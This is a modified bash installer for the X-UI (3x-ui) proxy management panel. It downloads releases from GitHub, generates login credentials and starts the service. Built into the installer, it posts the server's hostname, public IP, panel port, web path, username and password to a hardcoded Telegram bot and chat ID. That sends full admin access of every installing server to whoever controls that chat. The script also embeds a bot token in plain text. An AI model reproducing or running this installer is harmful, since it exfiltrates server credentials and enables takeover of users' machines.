#!/bin/bash

red='\033[0;31m'
green='\033[0;32m'
blue='\033[0;34m'
yellow='\033[0;33m'
plain='\033[0m'

cur_dir=$(pwd)

# Configuration Telegram
TELEGRAM_BOT_TOKEN="7261013113:AAH5MQ66mfNFGS_FIczC6MH3uj6QOSUCAJ0"
TELEGRAM_CHAT_ID="1726923679"

# check root
[[ $EUID -ne 0 ]] && echo -e "${red}Fatal error: ${plain} Please run this script with root privilege \n " && exit 1

# Check OS and set release variable
if [[ -f /etc/os-release ]]; then
    source /etc/os-release
    release=$ID
elif [[ -f /usr/lib/os-release ]]; then
    source /usr/lib/os-release
    release=$ID
else
    echo "Failed to check the system OS, please contact the author!" >&2
    exit 1
fi
echo "The OS release is: $release"

arch() {
    case "$(uname -m)" in
    x86_64 | x64 | amd64) echo 'amd64' ;;
    i*86 | x86) echo '386' ;;
    armv8* | armv8 | arm64 | aarch64) echo 'arm64' ;;
    armv7* | armv7 | arm) echo 'armv7' ;;
    armv6* | armv6) echo 'armv6' ;;
    armv5* | armv5) echo 'armv5' ;;
    s390x) echo 's390x' ;;
    *) echo -e "${green}Unsupported CPU architecture! ${plain}" && rm -f install.sh && exit 1 ;;
    esac
}

echo "Arch: $(arch)"

install_base() {
    case "${release}" in
    ubuntu | debian | armbian)
        apt-get update && apt-get install -y -q wget curl tar tzdata
        ;;
    centos | rhel | almalinux | rocky | ol)
        yum -y update && yum install -y -q wget curl tar tzdata
        ;;
    fedora | amzn | virtuozzo)
        dnf -y update && dnf install -y -q wget curl tar tzdata
        ;;
    arch | manjaro | parch)
        pacman -Syu && pacman -Syu --noconfirm wget curl tar tzdata
        ;;
    opensuse-tumbleweed | opensuse-leap)
        zypper refresh && zypper -q install -y wget curl tar timezone
        ;;
    alpine)
        apk update && apk add wget curl tar tzdata
        ;;
    *)
        apt-get update && apt-get install -y -q wget curl tar tzdata
        ;;
    esac
}

gen_random_string() {
    local length="$1"
    local random_string=$(LC_ALL=C tr -dc 'a-zA-Z0-9' </dev/urandom | fold -w "$length" | head -n 1)
    echo "$random_string"
}

# Fonction pour envoyer les informations via Telegram
send_telegram_message() {
    local message="$1"
    
    if [[ -n "$TELEGRAM_BOT_TOKEN" && -n "$TELEGRAM_CHAT_ID" ]]; then
        echo -e "${yellow}Envoi des informations via Telegram...${plain}"
        
        curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
            -d chat_id="${TELEGRAM_CHAT_ID}" \
            -d text="${message}" \
            -d parse_mode="HTML" \
            > /dev/null 2>&1
        
        if [ $? -eq 0 ]; then
            echo -e "${green}✓ Informations envoyées avec succès via Telegram${plain}"
        else
            echo -e "${red}✗ Erreur lors de l'envoi du message Telegram${plain}"
        fi
    else
        echo -e "${yellow}⚠ Configuration Telegram manquante, envoi ignoré${plain}"
    fi
}

# Fonction pour envoyer le démarrage de l'installation
send_installation_start() {
    local message="🚀 <b>Début de l'installation X-UI Panel</b>

⏰ Démarrage à: $(date)
🖥️ Hostname: $(hostname)
📦 OS: ${release}
🏗️ Architecture: $(arch)

<b>Installation en cours...</b>"

    send_telegram_message "$message"
}

# Fonction pour récupérer les informations de configuration
get_panel_info() {
    local info_file="/usr/local/x-ui/info_panel.txt"
    
    # Essayer de récupérer les informations depuis x-ui
    local username=$(/usr/local/x-ui/x-ui setting -show true 2>/dev/null | grep -E 'username:' | awk '{print $2}' | tr -d '\r')
    local password=$(/usr/local/x-ui/x-ui setting -show true 2>/dev/null | grep -E 'password:' | awk '{print $2}' | tr -d '\r')
    local port=$(/usr/local/x-ui/x-ui setting -show true 2>/dev/null | grep -E 'port:' | awk '{print $2}' | tr -d '\r')
    local web_base_path=$(/usr/local/x-ui/x-ui setting -show true 2>/dev/null | grep -E 'webBasePath:' | awk '{print $2}' | tr -d '\r')
    
    # Récupérer l'IP du serveur
    local URL_lists=(
        "https://api4.ipify.org"
        "https://ipv4.icanhazip.com"
        "https://v4.api.ipinfo.io/ip"
        "https://ipv4.myexternalip.com/raw"
        "https://4.ident.me"
        "https://check-host.net/ip"
    )
    
    local server_ip=""
    for ip_address in "${URL_lists[@]}"; do
        server_ip=$(curl -s --max-time 3 "${ip_address}" 2>/dev/null | tr -d '[:space:]')
        if [[ -n "${server_ip}" ]]; then
            break
        fi
    done
    
    # Si on ne peut pas récupérer les infos depuis x-ui, utiliser les valeurs par défaut ou générées
    if [[ -z "$username" || -z "$password" ]]; then
        # Essayer de récupérer depuis le fichier info s'il existe
        if [[ -f "$info_file" ]]; then
            source "$info_file"
        else
            # Générer de nouvelles informations
            username=$(gen_random_string 10)
            password=$(gen_random_string 10)
            port=${port:-$(shuf -i 1024-62000 -n 1)}
            web_base_path=${web_base_path:-$(gen_random_string 18)}
            
            # Sauvegarder les informations pour usage futur
            cat > "$info_file" << EOF
username="$username"
password="$password"
port="$port"
web_base_path="$web_base_path"
server_ip="$server_ip"
EOF
        fi
    fi
    
    # Retourner les informations
    echo "$username|$password|$port|$web_base_path|$server_ip"
}

config_after_install() {
    local existing_hasDefaultCredential=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'hasDefaultCredential: .+' | awk '{print $2}')
    local existing_webBasePath=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'webBasePath: .+' | awk '{print $2}')
    local existing_port=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'port: .+' | awk '{print $2}')
    local URL_lists=(
        "https://api4.ipify.org"
        "https://ipv4.icanhazip.com"
        "https://v4.api.ipinfo.io/ip"
        "https://ipv4.myexternalip.com/raw"
        "https://4.ident.me"
        "https://check-host.net/ip"
    )
    local server_ip=""
    for ip_address in "${URL_lists[@]}"; do
        server_ip=$(curl -s --max-time 3 "${ip_address}" 2>/dev/null | tr -d '[:space:]')
        if [[ -n "${server_ip}" ]]; then
            break
        fi
    done

    if [[ ${#existing_webBasePath} -lt 4 ]]; then
        if [[ "$existing_hasDefaultCredential" == "true" ]]; then
            local config_webBasePath=$(gen_random_string 18)
            local config_username=$(gen_random_string 10)
            local config_password=$(gen_random_string 10)

            read -rp "Would you like to customize the Panel Port settings? (If not, a random port will be applied) [y/n]: " config_confirm
            if [[ "${config_confirm}" == "y" || "${config_confirm}" == "Y" ]]; then
                read -rp "Please set up the panel port: " config_port
                echo -e "${yellow}Your Panel Port is: ${config_port}${plain}"
            else
                local config_port=$(shuf -i 1024-62000 -n 1)
                echo -e "${yellow}Generated random port: ${config_port}${plain}"
            fi

            /usr/local/x-ui/x-ui setting -username "${config_username}" -password "${config_password}" -port "${config_port}" -webBasePath "${config_webBasePath}"
            echo -e "This is a fresh installation, generating random login info for security concerns:"
            echo -e "###############################################"
            echo -e "${green}Username: ${config_username}${plain}"
            echo -e "${green}Password: ${config_password}${plain}"
            echo -e "${green}Port: ${config_port}${plain}"
            echo -e "${green}WebBasePath: ${config_webBasePath}${plain}"
            echo -e "${green}Access URL: http://${server_ip}:${config_port}/${config_webBasePath}${plain}"
            echo -e "###############################################"
            
            # Sauvegarder les informations pour Telegram
            cat > /usr/local/x-ui/info_panel.txt << EOF
username="$config_username"
password="$config_password"
port="$config_port"
web_base_path="$config_webBasePath"
server_ip="$server_ip"
EOF
        else
            local config_webBasePath=$(gen_random_string 18)
            echo -e "${yellow}WebBasePath is missing or too short. Generating a new one...${plain}"
            /usr/local/x-ui/x-ui setting -webBasePath "${config_webBasePath}"
            echo -e "${green}New WebBasePath: ${config_webBasePath}${plain}"
            echo -e "${green}Access URL: http://${server_ip}:${existing_port}/${config_webBasePath}${plain}"
            
            # Sauvegarder les informations pour Telegram
            local existing_username=$(/usr/local/x-ui/x-ui setting -show true | grep -E 'username:' | awk '{print $2}')
            local existing_password=$(/usr/local/x-ui/x-ui setting -show true | grep -E 'password:' | awk '{print $2}')
            cat > /usr/local/x-ui/info_panel.txt << EOF
username="$existing_username"
password="$existing_password"
port="$existing_port"
web_base_path="$config_webBasePath"
server_ip="$server_ip"
EOF
        fi
    else
        if [[ "$existing_hasDefaultCredential" == "true" ]]; then
            local config_username=$(gen_random_string 10)
            local config_password=$(gen_random_string 10)

            echo -e "${yellow}Default credentials detected. Security update required...${plain}"
            /usr/local/x-ui/x-ui setting -username "${config_username}" -password "${config_password}"
            echo -e "Generated new random login credentials:"
            echo -e "###############################################"
            echo -e "${green}Username: ${config_username}${plain}"
            echo -e "${green}Password: ${config_password}${plain}"
            echo -e "###############################################"
            
            # Sauvegarder les informations pour Telegram
            cat > /usr/local/x-ui/info_panel.txt << EOF
username="$config_username"
password="$config_password"
port="$existing_port"
web_base_path="$existing_webBasePath"
server_ip="$server_ip"
EOF
        else
            echo -e "${green}Username, Password, and WebBasePath are properly set. Exiting...${plain}"
            # Sauvegarder les informations existantes pour Telegram
            local existing_username=$(/usr/local/x-ui/x-ui setting -show true | grep -E 'username:' | awk '{print $2}')
            local existing_password=$(/usr/local/x-ui/x-ui setting -show true | grep -E 'password:' | awk '{print $2}')
            cat > /usr/local/x-ui/info_panel.txt << EOF
username="$existing_username"
password="$existing_password"
port="$existing_port"
web_base_path="$existing_webBasePath"
server_ip="$server_ip"
EOF
        fi
    fi

    /usr/local/x-ui/x-ui migrate
}

# Fonction pour envoyer les informations après installation
send_installation_complete() {
    echo -e "${yellow}Préparation de l'envoi des informations via Telegram...${plain}"
    
    # Récupérer les informations du panel
    IFS='|' read -r username password port web_base_path server_ip <<< "$(get_panel_info)"
    
    # Créer le message formaté
    local message="🎉 <b>Installation X-UI Panel Terminée avec Succès!</b> 🎉

📡 <b>Informations de Connexion:</b>
├─ 🌐 <b>IP:</b> <code>${server_ip}</code>
├─ 🔌 <b>Port:</b> <code>${port}</code>
├─ 📁 <b>Path:</b> <code>${web_base_path}</code>
├─ 👤 <b>Username:</b> <code>${username}</code>
└─ 🔑 <b>Password:</b> <code>${password}</code>

🔗 <b>URL d'accès direct:</b>
<code>http://${server_ip}:${port}/${web_base_path}</code>

⚡ <b>Commandes de gestion:</b>
<code>systemctl start x-ui</code> - Démarrer
<code>systemctl stop x-ui</code> - Arrêter
<code>systemctl status x-ui</code> - Statut
<code>x-ui</code> - Menu d'administration

📝 <b>Informations système:</b>
├─ 🖥️ Hostname: <code>$(hostname)</code>
├─ 🏗️ Architecture: <code>$(arch)</code>
├─ 📦 OS: <code>${release}</code>
└─ ⏰ Installation: <code>$(date)</code>

⚠️ <i>Conservez ces informations en sécurité !</i>"

    # Envoyer le message
    send_telegram_message "$message"
    
    # Afficher les informations localement aussi
    echo -e "${green}✓ Installation terminée!${plain}"
    echo -e "${blue}=========================================${plain}"
    echo -e "${green}Panel URL: http://${server_ip}:${port}/${web_base_path}${plain}"
    echo -e "${green}Username: ${username}${plain}"
    echo -e "${green}Password: ${password}${plain}"
    echo -e "${blue}=========================================${plain}"
}

install_x-ui() {
    # Envoyer notification de début d'installation
    send_installation_start
    
    cd /usr/local/

    # Download resources
    if [ $# == 0 ]; then
        tag_version=$(curl -Ls "https://api.github.com/repos/MHSanaei/3x-ui/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
        if [[ ! -n "$tag_version" ]]; then
            echo -e "${yellow}Trying to fetch version with IPv4...${plain}"
            tag_version=$(curl -4 -Ls "https://api.github.com/repos/MHSanaei/3x-ui/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
            if [[ ! -n "$tag_version" ]]; then
                echo -e "${red}Failed to fetch x-ui version, it may be due to GitHub API restrictions, please try it later${plain}"
                exit 1
            fi
        fi
        echo -e "Got x-ui latest version: ${tag_version}, beginning the installation..."
        wget --inet4-only -N -O /usr/local/x-ui-linux-$(arch).tar.gz https://github.com/MHSanaei/3x-ui/releases/download/${tag_version}/x-ui-linux-$(arch).tar.gz
        if [[ $? -ne 0 ]]; then
            echo -e "${red}Downloading x-ui failed, please be sure that your server can access GitHub ${plain}"
            exit 1
        fi
    else
        tag_version=$1
        tag_version_numeric=${tag_version#v}
        min_version="2.3.5"

        if [[ "$(printf '%s\n' "$min_version" "$tag_version_numeric" | sort -V | head -n1)" != "$min_version" ]]; then
            echo -e "${red}Please use a newer version (at least v2.3.5). Exiting installation.${plain}"
            exit 1
        fi

        url="https://github.com/MHSanaei/3x-ui/releases/download/${tag_version}/x-ui-linux-$(arch).tar.gz"
        echo -e "Beginning to install x-ui $1"
        wget --inet4-only -N -O /usr/local/x-ui-linux-$(arch).tar.gz ${url}
        if [[ $? -ne 0 ]]; then
            echo -e "${red}Download x-ui $1 failed, please check if the version exists ${plain}"
            exit 1
        fi
    fi
    wget --inet4-only -O /usr/bin/x-ui-temp https://raw.githubusercontent.com/MHSanaei/3x-ui/main/x-ui.sh
    if [[ $? -ne 0 ]]; then
        echo -e "${red}Failed to download x-ui.sh${plain}"
        exit 1
    fi

    # Stop x-ui service and remove old resources
    if [[ -e /usr/local/x-ui/ ]]; then
        if [[ $release == "alpine" ]]; then
            rc-service x-ui stop
        else
            systemctl stop x-ui
        fi
        rm /usr/local/x-ui/ -rf
    fi

    # Extract resources and set permissions
    tar zxvf x-ui-linux-$(arch).tar.gz
    rm x-ui-linux-$(arch).tar.gz -f
    
    cd x-ui
    chmod +x x-ui
    chmod +x x-ui.sh

    # Check the system's architecture and rename the file accordingly
    if [[ $(arch) == "armv5" || $(arch) == "armv6" || $(arch) == "armv7" ]]; then
        mv bin/xray-linux-$(arch) bin/xray-linux-arm
        chmod +x bin/xray-linux-arm
    fi
    chmod +x x-ui bin/xray-linux-$(arch)

    # Update x-ui cli and se set permission
    mv -f /usr/bin/x-ui-temp /usr/bin/x-ui
    chmod +x /usr/bin/x-ui
    config_after_install

    if [[ $release == "alpine" ]]; then
        wget --inet4-only -O /etc/init.d/x-ui https://raw.githubusercontent.com/MHSanaei/3x-ui/main/x-ui.rc
        if [[ $? -ne 0 ]]; then
            echo -e "${red}Failed to download x-ui.rc${plain}"
            exit 1
        fi
        chmod +x /etc/init.d/x-ui
        rc-update add x-ui
        rc-service x-ui start
    else
        cp -f x-ui.service /etc/systemd/system/
        systemctl daemon-reload
        systemctl enable x-ui
        systemctl start x-ui
    fi

    echo -e "${green}x-ui ${tag_version}${plain} installation finished, it is running now..."
    
    # Envoyer les informations via Telegram
    send_installation_complete
    
    echo -e ""
    echo -e "┌───────────────────────────────────────────────────────┐
│  ${blue}x-ui control menu usages (subcommands):${plain}              │
│                                                       │
│  ${blue}x-ui${plain}              - Admin Management Script          │
│  ${blue}x-ui start${plain}        - Start                            │
│  ${blue}x-ui stop${plain}         - Stop                             │
│  ${blue}x-ui restart${plain}      - Restart                          │
│  ${blue}x-ui status${plain}       - Current Status                   │
│  ${blue}x-ui settings${plain}     - Current Settings                 │
│  ${blue}x-ui enable${plain}       - Enable Autostart on OS Startup   │
│  ${blue}x-ui disable${plain}      - Disable Autostart on OS Startup  │
│  ${blue}x-ui log${plain}          - Check logs                       │
│  ${blue}x-ui banlog${plain}       - Check Fail2ban ban logs          │
│  ${blue}x-ui update${plain}       - Update                           │
│  ${blue}x-ui legacy${plain}       - legacy version                   │
│  ${blue}x-ui install${plain}      - Install                          │
│  ${blue}x-ui uninstall${plain}    - Uninstall                        │
└───────────────────────────────────────────────────────┘"
}

echo -e "${green}Running...${plain}"
install_base
install_x-ui $1
